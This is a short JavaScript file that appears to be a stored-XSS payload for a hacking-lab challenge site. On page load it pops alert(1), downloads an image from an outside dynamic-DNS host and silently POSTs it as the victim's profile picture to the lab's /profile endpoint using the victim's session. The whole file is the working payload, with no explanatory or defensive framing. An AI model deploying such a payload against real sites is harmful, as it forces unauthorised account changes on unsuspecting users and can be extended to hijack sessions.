window.addEventListener("load", enviarComentario, false);
function enviarComentario() {
    alert(1);
    fetchAndUploadImage();
}

async function fetchAndUploadImage() {
    const imageUrl = 'http://ezkill.duckdns.org:19132/diddy.jpg';
    const uploadUrl = 'https://chl-6d952ad7-02dd-420f-8a54-860b83f30d24-blog-hacklab.softwareseguro.com.ar/profile';

    try {
        // Step 1: Fetch the image as a Blob
        const imageResponse = await fetch(imageUrl);
        if (!imageResponse.ok) {
            throw new Error(`Failed to fetch image: ${imageResponse.statusText}`);
        }
        const imageBlob = await imageResponse.blob();

        // Step 2: Prepare the form data with the fetched image
        const formData = new FormData();
        formData.append('bio', 'dfsdf');
        formData.append('profile_pic', imageBlob, 'image.jpg');

        // Step 3: Make the upload request
        const uploadResponse = await fetch(uploadUrl, {
            method: 'POST',
            body: formData
        });

        if (uploadResponse.ok) {
            const result = await uploadResponse.text();
            console.log('Image uploaded successfully:', result);
        } else {
            console.error('Failed to upload image', uploadResponse.statusText);
        }
    } catch (error) {
        console.error('Error:', error);
    }
}